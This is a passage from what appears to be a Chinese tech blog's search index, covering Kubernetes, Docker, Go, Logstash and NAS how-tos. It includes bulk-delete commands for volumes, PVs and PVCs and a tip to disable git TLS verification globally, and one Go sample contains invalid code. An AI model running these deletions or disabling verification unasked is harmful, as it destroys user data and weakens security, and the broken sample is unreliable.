眼界、水平\n3. 面试中 3.1 开场 背景资料审阅 问候及自我介绍 开场白 做笔记 气氛 3.2 胜任力评估 专业能力：\n产品知识 研发知识 调研分析 沟通影响 解决问题 目标导向 根据 BEI 行为面试法，通过 GA 提问找到关键事，使用 START 行为事件访问法完整深入提问。\n3.3 START 提问方法 事的 START\nSituation，什么时候发生，什么人参与 Task，任务是什么，目标是什么 Action，事情的经过是什么 Result，结果是什么，再做一次怎么改进 人的 START\nSituation，你起到了什么作用 Task，你的目标和任务是什么 Action，你怎么做的，起到了什么作用 Result，你和其他人相比如何，学到了什么 3.4 START 陷阱 模糊 缺少具体、细节描述\n理论 有理论没实践\n意见 只表达观点和判断，而非事实、实例\n不完整 缺少人相关的 START，或只包含一部分\n3.5 真伪辨识 关键事件证明人 要求给出背调证明人，确认关键信息真伪\n数字验证 快速提 5 个关于数字的问题，15 分钟后再次确认\n3.6 价值观评估 3.7 动机评估 3.8 吸引候选人 公司竞争力:\n行业优势 公司优势 产品优势 技术优势 岗位竞争力:\n岗位优势 能力发展 职业发展 工作发展 3.8 结束面试 给候选人提问时间 给应征者尊重和对其需求的关注\n有效回复 客观、准确、谦虚\n中立立场 不直接给面试结论，感谢参加面试\n4. 面试后 4.1 评估反馈 好在哪里，不好在哪里，面试结论。\n4.2 协助入职 入职前紧密跟进\n5. 面试礼仪和误区 5.1 面试礼仪 面试时间 \u0026gt; 15 分钟 不要频繁看手机 面带微笑，和蔼可亲 衣着正式，整洁大方 认真倾听，坐姿端正 礼貌用语，尊重对方 5.2 面试禁区 当面给出面试结论 承诺薪资福利待遇 迟到 直接问敏感问题 5.3 易犯错误 首因效应，第一印象 趋中效应，缺少胜任力模型、冰山下部分 晕轮效应，以点概面，以偏概全 像我 6. 面试常见挑战 如何判断跨领域候选人的真实能力 介绍近期工作内容\n聚焦其中一项重点工作\n描述这项工作做的好的标准（锚定点）\n第四步，举个近期例子+ START 提问（对标好的标准）\n第五步，给自己打分\n如何判断跨领域候选人在新领域能够成功 是否发现了原领域做事情的规律\n是否总结出个人方法论\n为什么选择这个方向而不是别的\n第四步，有没有用你自己的这个方法去做尝试？效果怎么样？\n如何引导不爱说话的候选人 选择开放式问题\n切换沟通形式，用纸笔\n让对方讲故事\n遇到涛涛不绝的候选人，怎么打断他 重复他最后一句话\n主动总结一下内容\n提问结果是什么\n请喝水等对方接过杯子\n","description":"","id":182,"section":"post","tags":["整理","面试","培训"],"title":"面试官培训 - 精准识人","uri":"https://www.chenshaowen.com/blog/interviewer-training-about-how-to-choose-right-people.html"},{"content":" 最近在调研开源的 Kubernetes 管理平台，需求是能够管理内网的上百个集群。功能定位是辅助运维、向应用层提供能力，而非直接面向终端用户。\n1. Kubernetes Dashboard 项目地址：\nhttps://github.com/kubernetes/dashboard\n技术栈：Angular + Go\n关键字：\n单集群 K8s 资源管理 2. Kuboard 项目地址：\nhttps://github.com/eip-work/kuboard-press\n技术栈：Vue\n关键字：\n多集群 K8s 资源管理 3. Wayne 项目地址:\nhttps://github.com/Qihoo360/wayne (有段时间未更新)\n关键字:\n多集群 K8s 资源管理 审计 4. Kubevious 项目地址:\nhttps://github.com/kubevious/ui\nhttps://github.com/kubevious/backend\n技术栈: React\n关键字:\n多集群 K8s 资源管理 全资源检索 资源回滚 5. KubeSphere 项目地址:\nhttps://github.com/kubesphere/kubesphere\n技术栈: React + Go\n关键字:\n多集群 K8s 资源管理 CLI 安装、升级 KubeSphere Mini 入侵 应用商店 6. Rancher 项目地址:\nhttps://github.com/rancher/rancher\nhttps://github.com/rancher/dashboard\n技术栈：Vue + Go\n关键字：\n多集群 K8s 资源管理 Web 安装、升级 K8s Agent 入侵 Namespace 入侵 应用商店 7. KubeOperator 项目地址:\nhttps://github.com/KubeOperator/neeko\nhttps://github.com/KubeOperator/KubeOperator\nhttps://github.com/KubeOperator/KubePi\n技术栈: Vue + Go\n关键字:\n多集群 K8s 资源管理 Web 安装、升级 K8s 8. 总结 市面上的 Dashboard 大同小异，都能对 K8s 基础资源进行查看、编辑。不同的 Dashboard 具有不同侧重。\nKubernetes Dashboard 只能管理当前集群，简单但是有 Kubernetes 官方社区长期支持。如果只是查看、编辑资源，十分推荐。\nKuboard、Wayne 在 K8s 资源管理的基础之上，增加了对多集群的支持。\nKubevious 独辟蹊径，提供了很多差异化的特性，资源回滚、错误配置检测、集群资源检索等。\nKubeSphere、Rancher 都有商业公司运作，为了增加黏性，都会具有一定入侵性。KubeSphere 要求子集群安装最小化的 KubeSphere，Racher 要求安装 Agent。KubeSphere 针对的是开发全场景，Racher 针对的是集群运维管理。\nKubeOperator 将 K8s 资源管理剥离为子项目 KubePi，而专注于 K8s 集群本身的运维。此外，KubeOperator 和 Rancher 都对接了云厂商的 IaaS Api 可以直接申请主机。\n","description":"","id":183,"section":"post","tags":["博文","Kubernetes","对比","管理工具"],"title":"几种开源的 Kubernetes Web 端管理工具","uri":"https://www.chenshaowen.com/blog/several-open-source-kubernetes-web-management-tools.html"},{"content":"1. 安装准备 一个安装好 PE 的 U 盘 如果是 MacOS，可以使用 balenaEtcher 刻录 wepe for mac 镜像。\n下载 synoboot 文件 http://down.nas2x.com/synology/dsm/6.2/synoboot/\n下载 DSM.pat 文件 https://archive.synology.com/download/Os/DSM\n2. 开始操作 通过 PE 引导，进入系统\n将 synoboot 写入内置的 SSD 存储\n如果使用 U 盘引导，可能还需要修改 grup.cfg 中的 PID、VID 值。\n卸载 U 盘，重启系统，进入 Happy hacking 页面\n同网络的另外一台电脑访问 http://find.synology.com/\n选择上传 DSM.pat 文件进行安装，等待安装完成\n通过路由器查看 DSM 主机的 IP 地址，默认通过 http://IP:5000 访问 DSM 系统\n设置密码，初始化硬盘，Enjoy it\n","description":"","id":184,"section":"post","tags":["博文","DSM","磁盘"],"title":"安装 DSM 系统简易教程","uri":"https://www.chenshaowen.com/blog/a-easy-tutorial-of-installation-dsm-system.html"},{"content":"1. 安装 node exporter 1 2 3 wget https://github.com/prometheus/node_exporter/releases/download/v1.3.1/node_exporter-1.3.1.linux-amd64.tar.gz tar xvfz node_exporter-1.3.1.linux-amd64.tar.gz mv node_exporter-1.3.1.linux-amd64/node_exporter /usr/local/bin/ 如果访问不了 GitHub，可以参考: 国内访问 GitHub 的若干方法 。\n2. 配置并启动 exporter 新增 Systemd 配置 1 vim /etc/systemd/system/node_exporter.service 增加如下内容:\n1 2 3 4 5 6 7 8 9 10 11 12 [Unit] Description=Node Exporter After=network.target [Service] User=root Group=root Type=simple ExecStart=/usr/local/bin/node_exporter [Install] WantedBy=multi-user.target 启动 exporter 1 2 systemctl daemon-reload systemctl start node_exporter 添加开机自启动 1 systemctl enable node_exporter 本地查看 Metric 接口 1 2 3 4 5 6 7 8 9 curl localhost:9100/metric \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Node Exporter\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Node Exporter\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;\u0026lt;a href=\u0026#34;/metrics\u0026#34;\u0026gt;Metrics\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 3. Prometheus 配置 新增 job 由于 Prometheus 部署在 Kubernetes 上，这里直接编辑 ConfigMap 文件:\n1 kubectl -n monitor edit cm prometheus-server 在 scrape_configs 字段下，新增如下内容:\n1 2 3 4 5 6 scrape_configs: - job_name: dev static_configs: - targets: [\u0026#39;1.1.1.1:9100\u0026#39;] labels: instance: dev 查看 Targets 此时，Endpoint 的状态是 Up，表示上报数据成功。\n4. Grafana 配置 这里首先需要添加 Prometheus 源，然后导入 Grafana Dashboard，就可以看到面板了。参考: Prometheus、Grafana 搭建 Kubernetes 监控 。\n主机监控很多人用的是 8919 ，但我感觉面板有些复杂，这里使用的 1860 ，效果图如下:\n","description":"","id":185,"section":"post","tags":["博文","Grafana","监控","主机"],"title":"Granafa 配置主机监控","uri":"https://www.chenshaowen.com/blog/how-to-config-host-monitor-on-grafana.html"},{"content":"1. 背景和前置条件 Btrfs 文件系统相较于 Ext4 ，是一种更年轻的文件系统，具有更多可玩的特征，比如支持快照、子卷、校验和自检、软 RAID 甚至透明压缩等。\n但是在没有运维能力的情况下，建议不要使用 Btrfs 文件系统。本文记录的是，在群辉 DSM 系统下，将 Btrfs 文件系统的磁盘拆下后，读取数据的过程。\n在我的 DSM 系统中，有两块硬盘组成 RAID1 阵列，使用的是 Btrfs 文件系统。我将其中一块硬盘拆下，插入到另外一台苹果机器中。\n此外，这里要求，DSM 版本不低于 6.2，MacOS 系统上有 Parallels Desktop 并安装有 Ubuntu 版本不低于 18.04。\n如果你有 Windows 机器，那么也可以尝试使用 WinBtrfs 驱动进行文件读取。\n2. MacOS 上挂载硬盘 查看新插入的硬盘 可以看到 MacOS 无法直接识别 Btrfs 文件系统。忽略图片中显示 disk3，这是补的一张图，最初是 disk2。\n查看 MacOS 上的磁盘信息 1 2 3 4 5 6 7 8 9 10 11 diskutil list /dev/disk0 (internal, physical): #: TYPE NAME SIZE IDENTIFIER 0: GUID_partition_scheme *1.0 TB disk0 1: EFI EFI 209.7 MB disk0s1 2: Apple_APFS Container disk1 1000.0 GB disk0s2 ... /dev/disk2 (internal, physical): #: TYPE NAME SIZE IDENTIFIER 0: *4.0 TB disk2 使用 PD 命令工具将硬盘挂载到本地文件 进入 Home 目录\n1 cd ~ 新建硬盘指向物理磁盘\n1 /Applications/Parallels\\ Desktop.app/Contents/MacOS/prl_disk_tool create -p --hdd disk2.hdd --ext-disk-path /dev/disk2 3. 将硬盘挂载到 PD 的 Ubuntu 虚拟机 进入 Ubuntu 关闭主机，然后编辑虚拟机，添加一块硬盘，选择已经存在的硬盘，选中上面创建的 disk2.hdd 中的 HDD 格式文件。\n4. 在 Ubuntu 上读取 Btrfs 分区 切换到 root 用户 1 sudo -i 安装基础软件 1 apt-get install -y mdadm lvm2 识别文件系统 在 Disks 工具中，可以看到磁盘\n自动挂载分区\n1 mdadm -Asf \u0026amp;\u0026amp; vgchange -ay 查看 /dev/md4 分区，如果处于 inactive 状态，可以卸载之后，再次重试。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 mdadm -D /dev/md4 /dev/md4: Version : 1.2 Creation Time : Thu Apr 30 20:16:28 2020 Raid Level : raid1 Array Size : 3902187456 (3721.42 GiB 3995.84 GB) Used Dev Size : 3902187456 (3721.42 GiB 3995.84 GB) Raid Devices : 2 Total Devices : 1 Persistence : Superblock is persistent Update Time : Sat Dec 18 07:38:07 2021 State : clean, degraded Active Devices : 1 Working Devices : 1 Failed Devices : 0 Spare Devices : 0 Consistency Policy : resync Name : DiskStation:4 UUID : 9cf8faf4:c1c76801:3a4efd95:f021908b Events : 16609 Number Major Minor RaidDevice State - 0 0 0 removed 1 8 21 1 active sync /dev/sdb5 挂载 1 mount /dev/vg1/volume_1 /data 此时在 Ubuntu 系统 /data 目录下，已经可以访问 Btrfs 磁盘分区的数据。\n5. MacOS 上挂载 Ubuntu 目录访问文件 由于在 Ubuntu 中访问 Btrfs 磁盘分区的数据，不够方便，因此这里将 PD Ubuntu 中的目录挂载到 MacOS 系统中。\n安装 sshfs 及依赖 1 brew install macfuse sshfs-mac curlftpfs-mac 将 Ubuntu 系统的数据目录挂载到 MacOS 中 1 sshfs shaowenchen@10.211.55.12:/data /Users/shaowenchen/Data 在 MacOS 上查看 Btrfs 磁盘分区的数据 6. 参考 https://kb.synology.com/en-global/DSM/tutorial/How_can_I_recover_data_from_my_DiskStation_using_a_PC ","description":"","id":186,"section":"post","tags":["博文","MacOS","Btrfs","文件"],"title":"在 MacOS 上读取 Btrfs 分区文件","uri":"https://www.chenshaowen.com/blog/how-to-reading-btrfs-partition-files-under-macos.html"},{"content":"1. 升级 Go 版本之后 go.sum 版本不匹配 执行命令 go build 报错。\n错误提示：\nmissing go.sum entry for module providing package golang.org/x/time/rate; to add 解决办法：\n在 go build 之前更新 go.sum，执行命令 go mod tidy\n2. tls 错误 执行命令 go mod download 报错。\n错误提示：\nfatal: unable to access \u0026#39;https://github.com/agiledragon/gomonkey/\u0026#39;: GnuTLS recv error (-110): The TLS connection was non-properly terminated. 解决办法：\n禁用证书校验执行命令，export GIT_SSL_NO_VERIFY=1 或 git config --global http.sslVerify false。\n3. goproxy 不支持 latest 执行命令 go mod download 报错。\n错误提示：\ngithub.com/agiledragon/gomonkey: no matching versions for query \u0026#34;latest\u0026#34; 解决办法：\n换其他 goproxy 代理。\n","description":"","id":187,"section":"post","tags":["博文","Go","研发"],"title":"Go mod 使用问题","uri":"https://www.chenshaowen.com/blog/some-questions-of-using-go-mod.html"},{"content":"\n长时间运行的集群，常会面临各种资源耗尽的问题，另外磁盘不足时 Kubelet 还会主动清理镜像增加不确定因素，本文提供了一些命令片段用于清理工作。\n1. Kubernetes 基础对象清理 清理 Evicted 状态的 Pod 1 sudo kubectl get pods --all-namespaces -o wide | grep Evicted | awk \u0026#39;{print $1,$2}\u0026#39; | sudo xargs -L1 kubectl delete pod -n 清理 Error 状态的 Pod 1 sudo kubectl get pods --all-namespaces -o wide | grep Error | awk \u0026#39;{print $1,$2}\u0026#39; | sudo xargs -L1 kubectl delete pod -n 清理 Completed 状态的 Pod 1 sudo kubectl get pods --all-namespaces -o wide | grep Completed | awk \u0026#39;{print $1,$2}\u0026#39; | sudo xargs -L1 kubectl delete pod -n 清理没有被使用的 PV 1 sudo kubectl describe -A pvc | grep -E \u0026#34;^Name:.*$|^Namespace:.*$|^Used By:.*$\u0026#34; | grep -B 2 \u0026#34;\u0026lt;none\u0026gt;\u0026#34; | grep -E \u0026#34;^Name:.*$|^Namespace:.*$\u0026#34; | cut -f2 -d: | paste -d \u0026#34; \u0026#34; - - | sudo xargs -n2 bash -c \u0026#39;kubectl -n ${1} delete pvc ${0}\u0026#39; 清理没有被绑定的 PVC 1 sudo kubectl get pvc --all-namespaces | tail -n +2 | grep -v Bound | awk \u0026#39;{print $1,$2}\u0026#39; | sudo xargs -L1 kubectl delete pvc -n 清理没有被绑定的 PV 1 sudo kubectl get pv | tail -n +2 | grep -v Bound | awk \u0026#39;{print $1}\u0026#39; | sudo xargs -L1 kubectl delete pv 2. Linux 清理 查看磁盘全部空间 1 2 3 4 sudo df -hl / Filesystem Size Used Avail Use% Mounted on /dev/sda2 100G 47G 54G 47% / 查看指定目录占用 1 2 3 sudo du -sh . 24G\t. 删除指定前缀的文件夹 1 2 cd /nfsdata ls | grep archived- |xargs -L1 rm -r 清理僵尸进程 1 sudo ps -A -ostat,ppid | grep -e \u0026#39;^[Zz]\u0026#39; | awk \u0026#39;{print }\u0026#39; | xargs kill -HUP \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 3. Docker 清理 查看磁盘使用情况 1 2 3 4 5 6 7 sudo docker system df TYPE TOTAL ACTIVE SIZE RECLAIMABLE Images 361 23 178.5GB 173.8GB (97%) Containers 29 9 6.682GB 6.212GB (92%) Local Volumes 4 0 3.139MB 3.139MB (100%) Build Cache 0 0 0B 0B 清理 none 镜像 1 sudo docker images | grep none | awk \u0026#39;{print $3}\u0026#39; | sudo xargs docker rmi 清理不再使用的数据卷 1 sudo docker volume rm $(docker volume ls -q) 或者\n1 sudo docker volume prune 清理缓存 1 sudo docker builder prune 全面清理 删除关闭的容器、无用的存储卷、无用的网络、dangling 镜像（无 tag 镜像）\n1 docker system prune -f 清理正则匹配上的镜像 这里清理的是 master-8bcf8d7-20211206-111155163 格式的镜像。\n1 sudo docker images |grep -E \u0026#34;([0-9a-z]*[-]){3,}[0-9]{9}\u0026#34; |awk \u0026#39;{print $3}\u0026#39; | sudo xargs docker rmi 4. 设置定时 查看定时任务 1 sudo crontab -l 设置定时任务 1 sudo crontab -e 文本新增定时任务\n1 2 */35 */6 * * * sudo /usr/bin/docker images | grep none | awk \u0026#39;{print $3}\u0026#39; | xargs /usr/bin/docker rmi 45 1 * * * sudo /usr/bin/docker system prune -f 这里第一个任务是每隔六个小时的第 35 分钟执行，第二个任务每天的 1 时 45 分执行。这里需要注意的是，命令需要使用绝对路径，否则可能会执行失败。\n定时任务的格式 设置定时格式: * * * * * shell\n第一个星号，minute，分钟，值为 0-59\n第二个星号，hour，小时，值从 0-23\n第三个星号，day，天，值为从 1-31\n第四个星号，month，月，值为从 1-12 月，或者简写的英文，比如 Nov、Feb 等\n第五个星号，week 周，值为从 0-6 或者简写的英文，Wen、Tur 等，代表周几，其中 0 代表周末\n","description":"","id":188,"section":"post","tags":["博文","Kubernetes","实践","清理","运维"],"title":"常用的清理 Kubernetes 集群资源命令","uri":"https://www.chenshaowen.com/blog/common-commands-for-cleaning-up-kubernetes-cluster-resources.html"},{"content":"1. 时间与时区 1.1 时间标准 UTC，世界标准时间，是现在的时间标准，以原子时计时。\nGMT，格林威治时间，是以前的时间标准，规定太阳每天经过位于英国伦敦郊区的皇家格林威治天文台的时间为中午 12 点。\nUTC 时间更加准确，但如果对精度要求不高，可以视两种标准等同。\n1.2 时区划分 从格林威治本初子午线起，经度每向东或者向西间隔 15°，就划分一个时区，因此一共有 24 个时区，东、西个 12 个。\n但为了行政上的方便，通常会将一个国家或者一个省份划分在一起。下面是几个 UTC 表示的时间:\nUTC-6（CST — 北美中部标准时间） UTC+9（JST — 日本标准时间） UTC+8（CT/CST — 中原标准时间） UTC+5:30（IST — 印度标准时间） UTC+3（MSK — 莫斯科时区） 1.3 Local 时间 Local 时间为当前系统的带时区时间，可以通过 /etc/localtime 获取。实际上 /etc/localtime 是指向 zoneinfo 目录下的某个时区。下面是 MacOS 上的执行结果，Linux 上的路径会不一样:\n1 2 3 ls -al /etc/localtime lrwxr-xr-x 1 root wheel 39 Apr 26 2021 /etc/localtime -\u0026gt; /var/db/timezone/zoneinfo/Asia/Shanghai 2. Go 中的时间及序列化 2.1 Go 如何初始化时区 查找 TZ 变量获取时区 如果没有 TZ，那么使用 /etc/localtime 如果 TZ=\u0026quot;\u0026quot;，那么使用 UTC 当 TZ=\u0026ldquo;foo\u0026rdquo; 或者 TZ=\u0026quot;:foo\u0026quot;时，如果 foo 指向的文件将被用于初始化时区，否则使用 /usr/share/zoneinfo/foo 下面是 Go 实现的源码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 tz, ok := syscall.Getenv(\u0026#34;TZ\u0026#34;) switch { case !ok: z, err := loadLocation(\u0026#34;localtime\u0026#34;, []string{\u0026#34;/etc\u0026#34;}) if err == nil { localLoc = *z localLoc.name = \u0026#34;Local\u0026#34; return } case tz != \u0026#34;\u0026#34;: if tz[0] == \u0026#39;:\u0026#39; { tz = tz[1:] } if tz != \u0026#34;\u0026#34; \u0026amp;\u0026amp; tz[0] == \u0026#39;/\u0026#39; { if z, err := loadLocation(tz, []string{\u0026#34;\u0026#34;}); err == nil { localLoc = *z if tz == \u0026#34;/etc/localtime\u0026#34; { localLoc.name = \u0026#34;Local\u0026#34; } else { localLoc.name = tz } return } } else if tz != \u0026#34;\u0026#34; \u0026amp;\u0026amp; tz != \u0026#34;UTC\u0026#34; { if z, err := loadLocation(tz, zoneSources); err == nil { localLoc = *z return } } } 2.2 Go 时间字段的序列化 在 Go 使用 \u0026ldquo;encoding/json\u0026rdquo; 可以对 Time 字段进行序列化，使用 Format 可以对时间格式进行自定义。如下示例:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package main import ( \u0026#34;encoding/json\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) func main(){ fmt.Println(time.Now()) var a, _ := json.Marshal(time.Now()) fmt.Println(string(a)) a, _ = json.Marshal(time.Now().Format(time.RFC1123)) fmt.Println(string(a)) a, _ = json.Marshal(time.Now().Format(\u0026#34;06-01-02\u0026#34;)) fmt.Println(string(a)) } 输出结果:\n1 2 3 4 5 2021-12-07 16:44:44.874809 +0800 CST m=+0.000070010 \u0026#34;2021-12-07T16:44:44.874937+08:00\u0026#34; \u0026#34;Tue, 07 Dec 2021 16:44:44 CST\u0026#34; \u0026#34;00-120-74 16:44:07\u0026#34; \u0026#34;21-12-07\u0026#34; 2.3 Go 结构体中的时间字段序列化 在结构体中，如果直接使用 \u0026ldquo;encoding/json\u0026rdquo; 对结构体进行序列化，得到的将会是这样的时间格式: 2021-12-07T17:31:08.811045+08:00。无法使用 Format 函数对时间格式进行控制。\n那么，如何控制结构体中的时间格式呢？请看如下示例:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;time\u0026#34; \u0026#34;unsafe\u0026#34; \u0026#34;encoding/json\u0026#34; jsoniter \u0026#34;github.com/json-iterator/go\u0026#34; ) func main() { var json2 = NewJsonTime() var d = struct { Title string `json:\u0026#34;title\u0026#34;` StartedAt time.Time `json:\u0026#34;time\u0026#34;` }{ Title: \u0026#34;this is title\u0026#34;, StartedAt: time.Now(), } t1, _ := json.Marshal(d) fmt.Println(string(t1)) t2, _ := json2.Marshal(d) fmt.Println(string(t2)) } func NewJsonTime() jsoniter.API { var jt = jsoniter.ConfigCompatibleWithStandardLibrary jt.RegisterExtension(\u0026amp;CustomTimeExtension{}) return jt } type CustomTimeExtension struct { jsoniter.DummyExtension } func (extension *CustomTimeExtension) UpdateStructDescriptor(structDescriptor *jsoniter.StructDescriptor) { for _, binding := range structDescriptor.Fields { var typeErr error var isPtr bool name := strings.ToLower(binding.Field.Name()) if name == \u0026#34;startedat\u0026#34; { isPtr = false } else if name == \u0026#34;finishedat\u0026#34; { isPtr = false } else { continue } timeFormat := time.RFC1123Z locale, _ := time.LoadLocation(\u0026#34;Asia/Shanghai\u0026#34;) binding.Encoder = \u0026amp;funcEncoder{fun: func(ptr unsafe.Pointer, stream *jsoniter.Stream) { if typeErr != nil { stream.Error = typeErr return } var tp *time.Time if isPtr { tpp := (**time.Time)(ptr) tp = *(tpp) } else { tp = (*time.Time)(ptr) } if tp != nil { lt := tp.In(locale) str := lt.Format(timeFormat) stream.WriteString(str) } else { stream.Write([]byte(\u0026#34;null\u0026#34;)) } }} binding.Decoder = \u0026amp;funcDecoder{fun: func(ptr unsafe.Pointer, iter *jsoniter.Iterator) { if typeErr != nil { iter.Error = typeErr return } str := iter.ReadString() var t *time.Time if str != \u0026#34;\u0026#34; { var err error tmp, err := time.ParseInLocation(timeFormat, str, locale) if err != nil { iter.Error = err return } t = \u0026amp;tmp } else { t = nil } if isPtr { tpp := (**time.Time)(ptr) *tpp = t } else { tp := (*time.Time)(ptr) if tp != nil \u0026amp;\u0026amp; t != nil { *tp = *t } } }} } } type funcDecoder struct { fun jsoniter.DecoderFunc } func (decoder *funcDecoder) Decode(ptr unsafe.Pointer, iter *jsoniter.Iterator) { decoder.fun(ptr, iter) } type funcEncoder struct { fun jsoniter.EncoderFunc isEmptyFunc func(ptr unsafe.Pointer) bool } func (encoder *funcEncoder) Encode(ptr unsafe.Pointer, stream *jsoniter.Stream) { encoder.fun(ptr, stream) } func (encoder *funcEncoder) IsEmpty(ptr unsafe.Pointer) bool { if encoder.isEmptyFunc == nil { return false } return encoder.isEmptyFunc(ptr) } 输出结果:\n1 2 {\u0026#34;title\u0026#34;:\u0026#34;this is title\u0026#34;,\u0026#34;time\u0026#34;:\u0026#34;2021-12-07T17:31:08.811045+08:00\u0026#34;} {\u0026#34;title\u0026#34;:\u0026#34;this is title\u0026#34;,\u0026#34;time\u0026#34;:\u0026#34;Tue, 07 Dec 2021 17:31:08 +0800\u0026#34;} 这里主要是使用 \u0026ldquo;github.com/json-iterator/go\u0026rdquo; 包控制 Go 对时间字段的序列化，通过其提供的扩展指定 key 为 startedat、finishedat 的时间字段，指定序列化时使用 timeFormat := time.RFC1123Z 格式和 locale, _ := time.LoadLocation(\u0026quot;Asia/Shanghai\u0026quot;) 时区。\n3. 各种环境下设置时区 3.1 在 Linux 中 执行命令:\n1 timedatectl set-timezone Asia/Shanghai 或者设置 TZ 环境变量:\n1 2 TZ=\u0026#39;Asia/Shanghai\u0026#39; export TZ 都可以设置时区。\n3.1 在 Docker 中 在制作镜像时，直接在 Dockerfile 设置 TZ 变量，可能会碰到问题：\n1 2 3 FROM alpine ENV TZ=\u0026#39;Asia/Shanghai\u0026#39; COPY ./time.go . 报错: panic: time: missing Location in call to Time.In\n原因: 我们常用的 Linux 系统，例如 Ubuntu、CentOS，在 /usr/share/zoneinfo/ 目录下存放了各个时区而 alpine 镜像没有。\n因此 alpine 镜像需要安装一些额外的包。\n1 2 3 4 5 FROM alpine RUN apk add tzdata \u0026amp;\u0026amp; \\ cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \u0026amp;\u0026amp; \\ echo \u0026#34;Asia/Shanghai\u0026#34; \u0026gt; /etc/timezone 在运行容器时，可以直接挂载主机的时区描述文件:\n1 docker run -it --rm -v /etc/localtime:/etc/localtime:ro nginx 3.2 在 Kubernetes 中 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 apiVersion: v1 kind: Pod metadata: name: test namespace: default spec: restartPolicy: OnFailure containers: - name: nginx image: nginx-test imagePullPolicy: IfNotPresent volumeMounts: - name: date-config mountPath: /etc/localtime command: [\u0026#34;sleep\u0026#34;, \u0026#34;60000\u0026#34;] volumes: - name: date-config hostPath: path: /etc/localtime 这里将主机上的时区文件挂载到 Pod 中。\n4. 参考 https://github.com/json-iterator/go ","description":"","id":189,"section":"post","tags":["博文","Go","研发"],"title":"Go 中的时间和时区问题","uri":"https://www.chenshaowen.com/blog/the-tips-of-time-and-tz-in-go.html"},{"content":"1. Logstash 的基本原理 Logstash 是一个用于数据传输和处理的组件。\n通过插件的组合，Logstash 可以满足各种日志采集的场景：\nlogstash-\u0026gt;elasticsearch\nfilebeat-\u0026gt;logstash-\u0026gt;elasticsearch\nfilebeat-\u0026gt;kafka-\u0026gt;logstash-\u0026gt;elasticsearch\nfilebeat-\u0026gt;redis-\u0026gt;logstash-\u0026gt;elasticsearch\n2. Logstash 的基本配置 下面是一个 Logstash 的配置格式：\n1 2 3 4 5 6 7 8 9 10 11 12 # 数据源，例如 Kafka、MySQL input { } # 过滤器，用于处理数据，可选，例如丢掉空值、添加标签等 filter { } # 输出，例如 ES、文件 output { } input 数据源包括：\nazure_event_hubs、beats、cloudwatch、couchdb_changes、dead_letter_queue、elastic_agent、elasticsearch、exec、file、ganglia、gelf、generator、github、google_cloud_storage、google_pubsub、graphite、heartbeat、http、http_poller、imap、irc、java_generator、java_stdin、jdbc、jms、jmx、kafka、kinesis、log4j、lumberjack、meetup、pipe、puppet_facter、rabbitmq、redis、relp、rss、s3、s3-sns-sqs、salesforce、snmp、snmptrap、sqlite、sqs、stdin、stomp、syslog、tcp、twitter、udp、unix、varnishlog、websocket、wmi、xmpp。\n参考：ES 输入插件\nfilter 过滤插件包括：\nage、aggregate、alter、bytes、cidr、cipher、clone、csv、date、de_dot、dissect、dns、drop、elapsed、elasticsearch、environment、extractnumbers、fingerprint、geoip、grok、http、i18n、java_uuid、jdbc_static、jdbc_streaming、json、json_encode、kv、memcached、metricize、metrics、mutate、prune、range、ruby、sleep、split、syslog_pri、threats_classifier、throttle、tld、translate、truncate、urldecode、useragent、uuid、wurfl_device_detection、xml\n参考：ES 过滤插件\noutput 输出源包括：\nboundary、circonus、cloudwatch、csv、datadog、datadog_metrics、dynatrace、elastic_app_search、elastic_workplace_search、elasticsearch、email、exec、file、ganglia、gelf、google_bigquery、google_cloud_storage、google_pubsub、graphite、graphtastic、http、influxdb、irc、java_stdout、juggernaut、kafka、librato、loggly、lumberjack、metriccatcher、mongodb、nagios、nagios_nsca、opentsdb、pagerduty、pipe、rabbitmq、redis、redmine、riak、riemann、s3、sink、sns、solr_http、sqs、statsd、stdout、stomp、syslog、tcp、timber、udp、webhdfs、websocket、xmpp、zabbix\n参考：ES 输出插件\n在配置时，需要根据使用场景，结合官方文档进行调试。\n3. Logstash 的配置示例 3.1 标准出入到标准输出 1 2 3 4 5 6 input { stdin {} } output { stdout { codec =\u0026gt; rubydebug } } 3.2 文件到 ES 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 input { file { path =\u0026gt; [ \u0026#34;/data/nginx/logs/nginx_access.log\u0026#34; ] start_position =\u0026gt; \u0026#34;beginning\u0026#34; ignore_older =\u0026gt; 0 } } filter { # 使用 grok 插件对日志内容进行格式化 grok { match =\u0026gt; { \u0026#34;message\u0026#34; =\u0026gt; \u0026#34;%{COMBINEDAPACHELOG}\u0026#34; } } } output { elasticsearch { hosts =\u0026gt; [\u0026#34;127.0.0.1:9200\u0026#34;] index =\u0026gt; \u0026#34;nginx-access\u0026#34; } } 3.3 Filebeats 到 ES 1 2 3 4 5 6 7 8 9 10 11 input { beats { port =\u0026gt; 8088 } } output { elasticsearch { hosts =\u0026gt; [\u0026#34;127.0.0.1:9200\u0026#34;] index =\u0026gt; \u0026#34;beats\u0026#34; } } 3.4 Kafka 到 ES 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 input { kafka { bootstrap_servers =\u0026gt; 